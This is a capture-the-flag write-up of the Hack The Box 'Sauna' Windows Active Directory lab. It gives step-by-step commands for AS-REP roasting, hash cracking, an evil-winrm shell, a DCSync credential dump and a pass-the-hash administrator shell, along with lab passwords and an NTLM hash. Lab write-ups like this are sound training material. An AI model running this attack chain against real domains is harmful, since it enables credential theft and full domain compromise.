---
title: "Writeup: Sauna from Hack The Box"
author: Asier Núñez
pubDatetime: 2025-01-08T16:04:31.617Z
slug: sauna-writeup
featured: false
draft: false
tags:
  - Windows
  - Active Directory
  - Security
  - Ethical Hacking
  - Kerberos
  - DCSync
  - Hack The Box
description: "Writeup for the Sauna machine from Hack The Box, a Windows Active Directory box that involves Kerberos abuse and DCSync attacks."
---

## Enumeration

Domain: EGOTISTICAL-BANK.LOCAL.

Open Ports: 53,80,88,135,139,389,445,464,593,636,3268,3269,9389,49668,49674,49676,49696

## Initial Foothold

If we visit the `about.html` page, we can find full names. We could use this information and [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) to create a list of usernames.

```bash
/opt/username-anarchy/username-anarchy -i ./names --select-format first,flast,first.last,firstl > usernames.txt
```

With this list of usernames we can check if Kerberos pre-authentication is disabled for any of them.

```bash
while read p; do impacket-GetNPUsers egotistical-bank.local/"$p" -request -no-pass -dc-ip 10.129.163.173 >> hash.txt; done < usernames.txt
```

And bingo! `fsmith` has Kerberos pre-authentication disabled.

![GetNPUsers](@assets/images/writeups/htb/sauna/getNPUsers.png)

We can now use a tool like john to crack the hash.

```bash
john hash.txt --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt
```

![John](@assets/images/writeups/htb/sauna/john.png)

And we get the password `fsmith:Thestrokes23`.

Now we can use `evil-winrm` to get a shell.

```bash
evil-winrm -u fsmith -p Thestrokes23 -i 10.129.163.173
```

![Evil-WinRM](@assets/images/writeups/htb/sauna/evil-winrm.png)

## Privilege escalation

Once we are in the machine, we can use `PowerUp.ps1` to enumerate the system or upload WinPEAS via `evil-winrm`.

```bash
*Evil-WinRM* PS C:\Users\fsmith\Documents> upload /root/winPEASx64.exe
```

After running WinPEAS we can see that the user account `svc_loanmgr` is configured to auto-login.

![Peas-Auto](@assets/images/writeups/htb/sauna/peas-autologin.png)

```
svc_loanmgr:Moneymakestheworldgoround!
```

We can now run bloodhound to gather information about the domain.

```bash
bloodhound-python -d EGOTISTICAL-BANK.LOCAL -u svc_loanmgr -p Moneymakestheworldgoround! -c all -ns 10.129.163.173
```

![BloodHound](@assets/images/writeups/htb/sauna/bloodhound-py.png)

Once we upload the data to BloodHound, we can see that the user `svc_loanmgr` can perform DCSync attacks.

![DCSync-Perms](@assets/images/writeups/htb/sauna/dcsync-perms.png)

We can use `secretsdump` to perform a DCSync attack.

```bash
impacket-secretsdump EGOTISTICAL-BACK.LOCAL/svc_loanmgr@10.129.163.173
```

![DCSync](@assets/images/writeups/htb/sauna/dcsync.png)

We can use the hash to get a shell as `administrator`.

```
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e administrator@10.129.163.173
```

![Admin](@assets/images/writeups/htb/sauna/admin.png)
